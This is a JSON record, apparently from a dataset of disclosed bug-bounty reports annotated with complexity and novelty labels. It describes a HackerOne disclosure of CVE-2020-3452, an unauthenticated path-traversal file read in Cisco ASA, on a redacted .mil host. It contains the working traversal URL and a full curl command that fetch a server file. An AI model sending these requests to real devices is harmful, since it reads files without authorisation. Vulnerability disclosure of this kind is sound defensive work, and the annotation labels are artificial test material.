@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "mzfr ",
+  "title": "[CVE-2020-3452] Unauthenticated file read in Cisco ASA",
+  "content": "\nHey,\nI found out that host \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil was vulnerable to CVE-2020-3452.\nYou can test it by visiting the URL:\nCode 133 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua\nTo try it with CURL please run the following command:\nCode 693 Bytes\n1curl -i -s -k  -X $'GET' \\\n2    -H $'Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \\\n3    $'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nReference:\nhttps://www.secpod.com/blog/cve-2020-3452-affecting-85000-cisco-asa-ftd-devices/\nhttps://twitter.com/aboul3la/status/1286012324722155525\nImpact\nAnyone can read any file present on the server.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1602892140,
+  "report_url": "https://hackerone.com/reports/951530",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Visit the URL: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
+    ],
+    [
+      2,
+      "Alternatively, use the provided curl command to send a GET request to the same URL with specific headers."
+    ]
+  ],
+  "vuln_description": "This vulnerability allows unauthenticated users to read any file on the server due to a path traversal flaw in Cisco ASA's web interface. The issue is triggered by manipulating the 'name' parameter in the URL to traverse directories and access sensitive files.",
+  "reason": "The vulnerability is straightforward to exploit as it only requires crafting a specific URL or curl command. There are no complex interactions or state manipulations involved, and the attack vector is well-documented and similar to other path traversal vulnerabilities.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
